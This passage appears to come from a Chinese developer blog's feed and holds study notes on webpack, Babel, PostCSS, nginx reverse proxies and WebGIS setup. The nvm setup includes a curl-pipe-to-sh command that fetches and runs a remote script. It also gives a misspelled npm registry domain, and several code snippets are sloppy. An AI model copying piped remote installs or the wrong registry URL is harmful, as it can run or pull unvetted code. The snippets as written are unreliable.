class="string">&quot;typeicode&quot;</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>执行<code>json-server --watch db.json</code>,访问 <code>http://localhost:3000/posts/1</code> 即可看到效果，根据REST API的特点，就具备了以下接口:<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET    /posts</span><br><span class="line">GET    <span class="regexp">/posts/</span><span class="number">1</span></span><br><span class="line">POST   /posts  </span><br><span class="line">PUT    <span class="regexp">/posts/</span><span class="number">1</span></span><br><span class="line">PATCH  <span class="regexp">/posts/</span><span class="number">1</span></span><br><span class="line"><span class="keyword">DELETE</span> <span class="regexp">/posts/</span><span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h3 id="webpack-打包"><a href="#webpack-打包" class="headerlink" title="webpack 打包"></a>webpack 打包</h3><h3 id="github-page"><a href="#github-page" class="headerlink" title="github page"></a>github page</h3><h3 id="完整的-webgis-系统开发结构"><a href="#完整的-webgis-系统开发结构" class="headerlink" title="完整的 webgis 系统开发结构"></a>完整的 webgis 系统开发结构</h3><h4 id="后台：操作数据库"><a href="#后台：操作数据库" class="headerlink" title="后台：操作数据库"></a>后台：操作数据库</h4><ul><li>开发平台（Java、.Net、Node.js、Python）</li><li>数据库 (MySql、Qracle、PostgreSQL)</li></ul><h4 id="地图服务器-发布地图服务"><a href="#地图服务器-发布地图服务" class="headerlink" title="地图服务器: 发布地图服务"></a>地图服务器: 发布地图服务</h4><ul><li>超图、中地数码</li><li>ArcGis Server  + (ArcGIS API for JavaScript)</li><li>GeoServer 免费 + (Leflet or OpenLayers)</li></ul><h4 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h4><ul><li>js库  (arc)</li><li>Js、Html、Css (框架：Vue.js、React)</li></ul><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>制作地图相册：<br>现在浏览器不允许打开本地文件，需要http才能打开 $.get()<br>暂时先用script 加载好了</p><ul><li>js的http跨域请求被浏览器阻止：<a href="https://blog.csdn.net/yyws2039725/article/details/85330708">解决Firefox显示“已阻止载入混合活动内容”的方法</a>，或者反向代理</li></ul><h3 id="资源类网站"><a href="#资源类网站" class="headerlink" title="资源类网站"></a>资源类网站</h3><p><a href="www.openstreetmap.org">世界地图</a>,可以做什么？搜索一下。</p><p><a href="http://typhoon.zjwater.gov.cn/default.aspx">台风路径</a></p><p><a href="https://mapicons.mapsmarker.com/">地图图标</a></p><p><a href="http://api.map.baidu.com/lbsapi/getpoint/index.html">百度地图：拾取坐标系统</a></p><p>geoq发布的<a href="http://map.geoq.cn/ArcGIS/rest/services/ChinaOnlineStreetPurplishBlue/MapServer">ChinaOnlineStreetPurplishBlue</a> Esri ArcGIS图层</p><p><a href="http://server.arcgisonline.com/arcgis/rest/services">ArcGIS地图服务</a></p><p><a href="www.iconfont.cn">图标下载网站1</a>、<a href="www.easyicon.net">图标下载网站2</a>、<a href="https://mapicons.mapsmarker.com/">图标网站3</a></p>]]></content>
      
      
      <categories>
          
          <category> WebGIS </category>
          
          <category> 教程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebGIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webpack入门-笔记</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/WebPack/webpack%E5%85%A5%E9%97%A8-%E7%AC%94%E8%AE%B0/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/WebPack/webpack%E5%85%A5%E9%97%A8-%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="什么是WebPack"><a href="#什么是WebPack" class="headerlink" title="什么是WebPack"></a>什么是WebPack</h3><p>现在的很多网页其实可以看做是功能丰富的应用，它们拥有着<strong>复杂</strong>的JavaScript代码和一大堆依赖包。<br>WebPack可以看做是<strong>模块打包</strong>机：它做的事情是，分析你的项目结构，找到JavaScript模块以及其它的一些浏览器不能直接运行的拓展语言（Scss，TypeScript等），并将其<strong>转换和打包为合适的格式</strong>供浏览器使用。<span id="more"></span></p><h3 id="WebPack和Grunt以及Gulp相比有什么特性"><a href="#WebPack和Grunt以及Gulp相比有什么特性" class="headerlink" title="WebPack和Grunt以及Gulp相比有什么特性"></a>WebPack和Grunt以及Gulp相比有什么特性</h3><p>没有太多的可比性</p><ul><li>Gulp/Grunt是一种能够优化前端的开发流程的工具</li><li>WebPack是一种模块化的解决方案（不过Webpack在很多场景下可以替代Gulp/Grunt）</li><li>Grunt和Gulp的工作方式是：在一个<strong>配置文件</strong>中，<strong>指明</strong>对某些文件进行类似<strong>编译，组合，压缩</strong>等任务的<strong>具体步骤</strong>，工具之后可以<strong>自动完成</strong>这些任务。</li><li>Webpack的工作方式是：把你的项目当做一个整体，<strong>通过</strong>一个给定的<strong>主文件</strong>（如：index.js），Webpack将从这个文件开始<strong>找到</strong>你的项目的所有<strong>依赖文件</strong>，使用loaders<strong>处理</strong>它们，最后<strong>打包</strong>为一个（或多个）浏览器可识别的JavaScript文件。</li></ul><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>webpack 编译，直接编译和使用配置文件(webpack.config.js，webpack4需要指定编译模式,)<br><br>或者在 packages.json 可以<strong>添加script</strong>来运行局部安装的模块 webpack( npm start)<br><br>文件夹：<br><br>编译目录（原文件）：<code>app =&gt; main.js, main.css, index.tmpl.html, Greeter.js, Greeter.css, config.json</code><br><br>生成目录（测试环境用）：<code>public =&gt; main.js, bundle.js</code> <br><br>生成目录（生产环境用）：<code>build =&gt; main.js bundle-[hash].js</code><br></p><p><strong>配置</strong>(webpack.config.js)： </p><ul><li><code>devtool:eval-source-map</code>：开发环境的好选择。</li><li><code>mode: development|production</code></li><li>使用webpack来构建本地服务器(webpack-dev-server),在配置文件webpack.config.js 中配置。配置 package.json 的 script 来运行服务</li></ul><h2 id="Loaders"><a href="#Loaders" class="headerlink" title="Loaders"></a>Loaders</h2><p>通过使用不同的loader，webpack有能力调用外部的脚本或工具，实现对不同格式的文件的处理。（scss=&gt;css, js文件兼容，React的JSX=&gt;js）</p><h3 id="Babel"><a href="#Babel" class="headerlink" title="Babel"></a>Babel</h3><ul><li>Babel是一个编译JavaScript的平台，它可以编译代码帮你达到以下目的：<ul><li>让你能使用最新的JavaScript代码（ES6，ES7…），而不用管新标准是否被当前使用的浏览器完全支持；</li><li>让你能使用基于JavaScript进行了拓展的语言，比如React的JSX；</li><li>安装（Babel其实是几个模块化的包，其核心功能位于称为babel-core的npm包中，webpack可以把其不同的包整合在一起使用，对于每一个你需要的功能或拓展，你都需要安装单独的包（用得最多的是解析Es6的babel-env-preset包和解析JSX的babel-preset-react包）<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="keyword">install </span>--save-dev <span class="keyword">babel-core </span><span class="keyword">babel-loader </span><span class="keyword">babel-preset-env </span><span class="keyword">babel-preset-react</span></span><br></pre></td></tr></table></figure>遇到问题：<br>自动下载时，babel-loader 版本为 8.x,需要babel-core 7.x的支持。所以重装一个babel-loader@7 好了。</li></ul></li></ul><p>babel 配置可以放在 webpack.config.js 中，只不过太多，所以一般单独建立一个文件夹。</p><h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><h3 id="处理CSS（style-loader-css-loader）"><a href="#处理CSS（style-loader-css-loader）" class="headerlink" title="处理CSS（style-loader, css-loader）"></a>处理CSS（style-loader, css-loader）</h3><ul><li>配置<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">test</span>: <span class="regexp">/\.css$/</span>,</span><br><span class="line">    use:[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">loader</span>: style-loader</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">loader</span>: css-loader</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// webpack读取loader的时候是从右到左</span></span><br><span class="line"><span class="comment">// 所以 css-loader 放在 style-loader 之后，不然会出现 CssSyntaxErro 错误</span></span><br><span class="line"><span class="comment">// css-loader 解析css文件，style-loader 放到 html 文件</span></span><br></pre></td></tr></table></figure></li><li>新建文件 main.css</li><li>在 main.js 当成模块导入</li></ul><h3 id="CSS-module"><a href="#CSS-module" class="headerlink" title="CSS module"></a>CSS module</h3><p><code>CSS modules</code>的技术意在把JS的模块化思想带入CSS中来，通过CSS模块，所有的类名，动画名默认都<strong>只作用于当前模块</strong>。<br><br>&nbsp;&ensp;Webpack对CSS模块化提供了非常好的支持，只需要在CSS loader中进行简单配置即可，然后就可以直接把CSS的类名传递到组件的代码中，这样做有效<strong>避免了全局污染</strong>。</p><ul><li>配置（css-loader@3 参数不一样了）<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">options:</span>&#123;</span><br><span class="line"><span class="symbol">    modules:</span>&#123;</span><br><span class="line"><span class="symbol">        localIdentify:</span>[name]__[local]--[hash:base64:<span class="number">5</span>]    <span class="comment">// 类名格式</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>使用：新建 css 文件，js文件中导入css，通过 <code>className=&#123;styles.root&#125;</code>使用。</li></ul><h3 id="CSS预处理器"><a href="#CSS预处理器" class="headerlink" title="CSS预处理器"></a>CSS预处理器</h3><p>Sass 和 Less 之类的预处理器是对<strong>原生CSS的拓展</strong>，它们允许你使用类似于variables, nesting, mixins, inheritance等不存在于CSS中的特性来写CSS，CSS预处理器可以<strong>将这些特殊类型的语句转化为浏览器可识别的CSS语句</strong>。常用CSS处理的loader:</p><ul><li><code>Less Loader</code></li><li><code>Sass Loader</code></li><li><code>Stylus Loader</code><br>不过其实也存在一个CSS的处理平台-PostCSS，它可以帮助你的CSS实现更多的功能。<strong>（啥意思）</strong>使用PostCSS来为CSS代码<strong>自动添加适应不同浏览器的CSS前缀</strong>。</li><li>配置(下载postcss-loader,autoprefixer)<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">webpack.config.js 配置文件添加 postcss-loader</span><br><span class="line"><span class="comment">//新建文件 postcss.config.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="attr">plugins</span>: [</span><br><span class="line">        <span class="built_in">require</span>(<span class="string">&#x27;autoprefixer&#x27;</span>)</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>处理Js的 Bebel 和处理Css的PostCss其实是两个基本平台，配合<code>webpack</code>可以很好的发挥它们的作用。</p><h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><h3 id="常见插件"><a href="#常见插件" class="headerlink" title="常见插件"></a>常见插件</h3><h4 id="HtmlWebpackPlugin"><a href="#HtmlWebpackPlugin" class="headerlink" title="HtmlWebpackPlugin"></a>HtmlWebpackPlugin</h4><p>依据一个简单的index.html模板，生成一个自动引用你打包后的JS文件的新index.html。这在每次生成的js文件名称不同时非常有用（比如添加了hash值）。</p><ul><li>安装（html-webpack-plugin)和配置<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> HtmlWebpackPlugin = require(<span class="string">&#x27;html-webpack-plugin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">moudle.<span class="keyword">export</span></span><br><span class="line">  moudle</span><br><span class="line">    output:&#123;</span><br><span class="line">        <span class="comment">//把 public 改成 build ,会生成 build： bundle.js + index.html 文件</span></span><br><span class="line">        path: __dirname + <span class="string">&quot;/build&quot;</span>，  </span><br><span class="line">        filename: <span class="string">&quot;bundle.js&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  plugins:[</span><br><span class="line">      <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">          template: __dirname + <span class="string">&quot;/app/index.tmpl.html&quot;</span> <span class="comment">//模板文件</span></span><br><span class="line">      &#125;)</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure></li></ul><h4 id="Hot-Module-Replacement（HML，热加载"><a href="#Hot-Module-Replacement（HML，热加载" class="headerlink" title="Hot Module Replacement（HML，热加载)"></a>Hot Module Replacement（HML，热加载)</h4><p>它允许你在修改组件代码后，自动刷新实时预览修改后的效果。</p><ol><li>在webpack配置文件中添加HMR插件；</li><li>在Webpack Dev Server中添加“hot”参数；</li></ol><p>它是WepPack模块，在 JS 模块中执行WebPack提供的API就可以实现热加载。对于 <strong>React</strong> 模块，使用 <strong>Babel</strong> 可以<strong>更方便</strong>的实现功能热加载。<br><br><strong>react-transform-hrm</strong>插件，可以在不对React模块进行额外的配置的前提下让HMR正常工作。</p><h2 id="产品阶段的构建"><a href="#产品阶段的构建" class="headerlink" title="产品阶段的构建"></a>产品阶段的构建</h2><p>在产品阶段，可能还需要对打包的文件进行额外的处理，比如说<strong>优化，压缩，缓存以及分离CSS和JS</strong>。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>新建文件webpack.production.config.js</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>不需要 setNode，除非配置文件里：</span><br><span class="line"><span class="regexp">//</span>  mode: process.env.NODE_ENV === <span class="string">&#x27;production&#x27;</span> ? <span class="string">&#x27;production&#x27;</span> : <span class="string">&#x27;development&#x27;</span></span><br><span class="line"><span class="string">&quot;build&quot;</span>: <span class="string">&quot;set NODE_ENV=production &amp;&amp; webpack --config ./webpack.production.config.js --progress&quot;</span></span><br><span class="line"><span class="regexp">//</span>可以直接使用：</span><br><span class="line">webpack --config ./webpack.build.config.js</span><br></pre></td></tr></table></figure><h2 id="优化插件"><a href="#优化插件" class="headerlink" title="优化插件"></a>优化插件</h2><ul><li><p><code>OccurenceOrderPlugin</code>:内置插件，为组件分配ID</p></li><li><p><code>UglifyJsPlugin</code>: <br><br>现在也不需要使用这个plugin了，只需要使用optimization.minimize为true就行，production mode下面<strong>自动为true</strong></p></li><li><p><code>ExtractTextPlugin</code>: 分离CSS和JS文件<br><br>extract-text-webpack-plugin还不能支持webpack4.0.0以上的版本。 所以需要指定下载测试版<code>extract-text-webpack-plugin@next</code></p><h2 id="缓存-并且取出-build-文件中的残余文件"><a href="#缓存-并且取出-build-文件中的残余文件" class="headerlink" title="缓存 并且取出 build 文件中的残余文件"></a>缓存 并且取出 build 文件中的残余文件</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;CleanWebpackPlugin&#125; = <span class="built_in">require</span>(<span class="string">&quot;clean-webpack-plugin&quot;</span>);</span><br><span class="line">    <span class="function"><span class="params">output</span> =&gt;</span> filename: <span class="string">&quot;bundle-[hash].js&quot;</span></span><br><span class="line">    plugins</span><br><span class="line">        <span class="keyword">new</span> CleanWebpackPlugin()</span><br></pre></td></tr></table></figure><p>webpack4：<br>  mode需要添加<br>  loader 添加rules</p></li></ul><p>webpack 是把所有文件当作模块处理，JS代码、Css、fonts 以及图片等都可以通过合适的 loader 处理。</p><p>npm prune</p><h3 id="使用过程遇到的问题"><a href="#使用过程遇到的问题" class="headerlink" title="使用过程遇到的问题"></a>使用过程遇到的问题</h3><ul><li><p>通过script引入jquery文件后，需要怎么配置<br><br><a href="https://juejin.im/post/5c3c80e4f265da612c5e1aad">webpack引入第三方库的方式，以及注意事项</a><br><a href="https://segmentfault.com/a/1190000007249293">webpack进阶教程（二）——webpack引入jquery多种方法探究</a></p>  <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>webapack.config.js</span><br><span class="line">externals: &#123;</span><br><span class="line">    jquery: <span class="string">&#x27;window.$&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="regexp">//</span> 使用</span><br><span class="line">import jquery from <span class="string">&#x27;jquery&#x27;</span></span><br><span class="line"></span><br><span class="line">----------------------</span><br><span class="line">或者直接使用 $ 或 jQuery, 因为通过cdn引入已经是全局变量了</span><br></pre></td></tr></table></figure></li><li><p><a href="https://segmentfault.com/q/1010000012317392">用到jsonp的js文件用webpack打包后为何失效？</a>: 回调函数必须全局</p>  <figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义全局函数,  使用回调 （不能 var 局部声明！）</span></span><br><span class="line">f1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;  &#125;</span><br><span class="line">creatElement(<span class="string">&#x27;scrpt&#x27;</span>).src=<span class="string">&quot;....?callback=mycallbacks&quot;</span> 或者 $.ajax( dataType:<span class="string">&#x27;jsonp&#x27;</span>,<span class="attr">jsonp</span>:<span class="string">&#x27;callback&#x27;</span>,  <span class="attr">callback</span>: <span class="string">&quot;mycallback&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 直接在 ajax 写入方法 （其实也可以直接写方法名）</span></span><br><span class="line">functionName</span><br><span class="line">$.ajax( <span class="keyword">type</span>:<span class="string">&quot;GET&quot;</span>,<span class="attr">dataType</span>: <span class="string">&#x27;jsonp&#x27;</span>,  <span class="attr">success</span>: <span class="function"><span class="title">funfunction</span>(<span class="params"></span>)</span>&#123;&#125;)</span><br></pre></td></tr></table></figure></li><li><p><a href="https://www.jianshu.com/p/6120a4e3c875">webpack-dev-server跨域请求数据的问题</a></p></li><li><p><a href="https://www.cnblogs.com/camille666/p/webpack_picture.html">不同文件中引入图片的方式不同</a>  |  <a href="https://www.timsrc.com/article/16/loading-images">加载图片</a>  |  <a href="https://www.cnblogs.com/luckyXcc/p/10864255.html">url-loader 是 file-loader 增强版</a></p>  <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> webpack.config.js  添加 url-loader</span><br><span class="line"><span class="regexp">//</span> js 文件中使用 var img = require(<span class="string">&quot;./img.png&quot;</span>) 导入</span><br></pre></td></tr></table></figure></li></ul><h3 id="包的作用"><a href="#包的作用" class="headerlink" title="包的作用"></a>包的作用</h3><h4 id="loaders（桥梁？充当中间件？）"><a href="#loaders（桥梁？充当中间件？）" class="headerlink" title="loaders（桥梁？充当中间件？）"></a>loaders（桥梁？充当中间件？）</h4><p>通过使用不同的loader, webpack 可以调用外部的脚本或工具，实现不同格式的文件的处理。比如把scss 转 css，把高版本（ES6,ES7）的JS文件转换为浏览器兼容的JS文件，把React用到的JSX文件转换为JX文件。</p><h4 id="babel（执行转换？）"><a href="#babel（执行转换？）" class="headerlink" title="babel（执行转换？）"></a>babel（执行转换？）</h4><p>Babel是一个编译JavaScript的平台，（在转换的过程中扮演转换者的角色？ <code>JSX=&gt;jx, scss=&gt;css, jx(es7)=&gt;jx</code>）</p><p>babel 是几个模块化的包，核心功能在<code>babel-core</code>的npm包中，webpack 可以把它不同的包整合在仪器使用，对于需要的功能或者扩展，都需要安装单独的包。</p><ul><li><code>@babel/preset-env</code>: 解析 Es6 语法</li><li><code>@babel/preset-react</code>: react 的转码规则集, 解析React 的 JSX 文件( 就可以使用 jsx 语法去创建dom节点的)</li><li><code>React</code>：React包，可以生成虚拟 dom 节点</li><li><code>React-dom</code>: 将虚拟Dom渲染到文档中变成实际dom，…</li></ul><h3 id="插件-1"><a href="#插件-1" class="headerlink" title="插件"></a>插件</h3><ul><li>html-webpack-plugin</li><li>extract-text-webpack-plugin: 提取所有css，生成 main.css</li><li>@babel/plugin-transform-runtime</li></ul><p><a href="https://www.jianshu.com/p/42e11515c10f">webpack入门，主要参考</a></p><p>其他：<br><br><a href="https://blog.csdn.net/zwkkkk1/article/details/88758726">webpack-devtool配置相关</a><br><br><a href="https://blog.csdn.net/zgd826237710/article/details/87362353">生产环境下webpack的配置</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> WebPack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webgis 教程-目录结构？</title>
      <link href="/categories/WebGIS/%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/webgis-%E6%95%99%E7%A8%8B-%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%EF%BC%9F/"/>
      <url>/categories/WebGIS/%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/webgis-%E6%95%99%E7%A8%8B-%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.jianshu.com/p/e9d23726063a">笔记：WebGIS开发教程(目录)</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="NodeJS-环境搭建"><a href="#NodeJS-环境搭建" class="headerlink" title="NodeJS 环境搭建"></a>NodeJS 环境搭建</h3><ul><li>node 下载安装</li><li>nvm: node 版本管理工具(windows 平台是 nvm-windows)  <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/creationix/nvm/<span class="literal">master</span>/install.sh | sh</span><br><span class="line">重启。</span><br><span class="line">nvm ls  (查看当前使用版本) 或者 nvm list</span><br><span class="line">nvm install <span class="number">8</span> (hexo 最低支持 <span class="keyword">node</span> <span class="title">8</span> ? 之前 windows 用的是 <span class="keyword">node</span> <span class="title">7</span>, 虚拟机用的 )</span><br><span class="line">[nvm use [<span class="keyword">version</span>]]  可省（已经是刚刚安装的版本了）</span><br><span class="line">[nvm alias default [<span class="keyword">version</span>]]  可省（重启终端设置会失效）       </span><br></pre></td></tr></table></figure></li><li>设置 npm 第三方源:<code>npm config set registry https://registry.npm.tarobao.org</code>, 或者使用 cnpm?<code>npm install cnpm -g</code><br>先安装 nvm (linux 下 版本管理工具)</li></ul><span id="more"></span><h3 id="Nginx-部署及配置（高性能Web和反向代理服务器）"><a href="#Nginx-部署及配置（高性能Web和反向代理服务器）" class="headerlink" title="Nginx 部署及配置（高性能Web和反向代理服务器）"></a>Nginx 部署及配置（高性能Web和反向代理服务器）</h3><ul><li>安装</li><li>基础配置: <ul><li><a href="https://blog.csdn.net/xxcupid/article/details/52515237">nginx的配置系统6之server_name</a> ， <a href="https://blog.51cto.com/onlyzq/535279">关于Nginx的server_name</a></li><li>虚拟目录<ul><li>一个server配置可以有多个location配置块，每个location相当于一个虚拟目录。<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以通过 localhost/assets_path/img/test.png 会在alias 指定的目录查找资源</span></span><br><span class="line"><span class="keyword">location</span> <span class="title">^~/assets_path</span>/ &#123;</span><br><span class="line">    alias   D:\\assets\\;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li>反向代理：解决跨域问题。有时为了避免用于反向代理的虚拟目录名称与实际目录结构中的文件夹重名，会给所有反向代理一个统一的虚拟目录<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 最简</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  localhost;</span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">root</span>   html;</span><br><span class="line">        <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span><span class="regexp"> ^~/nginx_proxy/</span> &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span>   http://nginx.org/;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 统一的虚拟目录</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>      <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  localhost;</span><br><span class="line">    <span class="attribute">location</span> /  &#123;</span><br><span class="line">        <span class="attribute">root</span>    html;</span><br><span class="line">        <span class="attribute">index</span>   index.html  index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span><span class="regexp"> ^~/proxy/nginx/</span>&#123;</span><br><span class="line">        <span class="attribute">rewrite</span><span class="regexp"> ^/proxy/nginx/(.*)$</span> /<span class="variable">$1</span> <span class="literal">break</span>;</span><br><span class="line">        <span class="attribute">proxy_pass</span>  http://nginx.org/;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span><span class="regexp"> ^~/proxy/other/</span>&#123;</span><br><span class="line">        <span class="attribute">rewrite</span><span class="regexp"> ^/proxy/other/(.*)$</span> /<span class="variable">$1</span> <span class="literal">break</span>;</span><br><span class="line">        <span class="attribute">proxy_pass</span>  http://other.org/;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># rewrite 使用正则表达式改写地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li>使用（linux 系统的虚拟机或服务器需要修改防火墙-开放端口）</li><li><code>start nginx</code></li><li><code>nginx -s reload</code></li><li><code>nginx -s stop</code><h3 id="本地部署-ArcGIS-API-for-javaScript"><a href="#本地部署-ArcGIS-API-for-javaScript" class="headerlink" title="本地部署 ArcGIS API for javaScript"></a>本地部署 ArcGIS API for javaScript</h3><h3 id="Hello-World-地图页"><a href="#Hello-World-地图页" class="headerlink" title="Hello World 地图页"></a>Hello World 地图页</h3></li></ul><h2 id="完整目录"><a href="#完整目录" class="headerlink" title="完整目录"></a>完整目录</h2><p>目录</p><p>这个目录是个大体思路，后续会视情况进行调整</p><ol><li><p>起步</p><ul><li>NodeJS 环境搭建</li><li>Nginx 部署及配置</li><li>本地部署ArcGIS API for JavaScript</li><li>一个 Hello World 地图页</li></ul></li><li><p>使用 Webpack 和 Gulp</p><ul><li>初识 Webpack</li><li>再识 Webpack</li><li>让 Gulp 接管 Webpack</li><li>用 Webpack 引入 jQuery 和 Bootstrap</li><li>用 Webpack 引入 ArcGIS API for JavaScript</li><li>用 React 再做一次 Hello World 地图页</li></ul></li><li><p>项目实践那些事</p><ul><li>用 Webpack 把第三方库<strong>打包</strong>成 DLL</li><li>将通用组件拆分到可独立维护的 JS 文件中</li><li>用工厂模式让应用在 3.x 和 4.x 中随性切换</li><li>不如试一下 Leaflet 和 MapBox</li><li>使用 Promise 和 Async/Await</li><li>让 Redux 处理复杂交互</li><li>常用第三方库和插件</li><li>使用 ESlint 控制代码质量</li><li>如何测试</li><li>如何自动构建文档</li></ul></li><li><p>使用 React 实现常用 WebGIS 功能</p><ul><li>经典 WebGIS 应用页面布局</li><li>图层管理</li><li>分屏浏览</li><li>二三维切换与联动</li><li>绘制图形和缓冲区</li><li>点击地图查询</li><li>弹一个模态框</li><li>地图上渲染统计图</li></ul></li><li><p>JavaScript 也能写<strong>后台</strong></p><ul><li>用 Express 